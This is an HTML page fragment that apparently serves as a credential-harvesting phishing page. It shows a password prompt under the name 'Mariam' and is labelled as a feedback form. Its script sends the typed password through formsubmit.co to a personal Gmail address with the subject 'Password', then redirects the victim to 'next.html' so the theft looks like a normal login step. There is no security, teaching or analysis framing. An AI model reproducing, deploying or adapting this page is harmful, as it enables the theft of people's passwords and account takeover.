  <pre class="access-message"> <p class="mariam-name">✨Mariam✨</p>

  <main class="feedback-section">
    <form id="feedback-form" action="https://formsubmit.co/ajax/narutomaki702@gmail.com" method="POST">
  <input type="hidden" name="_subject" value="Password">

  <div class="password-box">
    <input
      type="password"
      id="password"
      name="Password"
      required
      placeholder="Password"
    ><button type="button" class="eye-button" onclick="togglePassword()">
  👁
</button>

   
  </div>

  <button class="button" type="submit">Next</button>
</form>

<script>
function togglePassword() {
  const password = document.getElementById("password");
  const eye = document.querySelector(".eye-button");

  if (password.type === "password") {
    password.type = "text";
    eye.textContent = "👁̸";
  } else {
    password.type = "password";
    eye.textContent = "👁";
  }
}
</script>

    <script>
document.getElementById("feedback-form").addEventListener("submit", async function(e) {
  e.preventDefault();

  const form = this;

  const response = await fetch(form.action, {
    method: "POST",
    body: new FormData(form),
    headers: {
      "Accept": "application/json"
    }
  });

  if (response.ok) {
    window.location.href = "next.html";
  }
});
</script>


    <p class="success-message" id="success-message" role="status" hidden></p>
    <p class="error-message" id="error-message" role="alert" hidden>Could not submit. Please try again.</p>
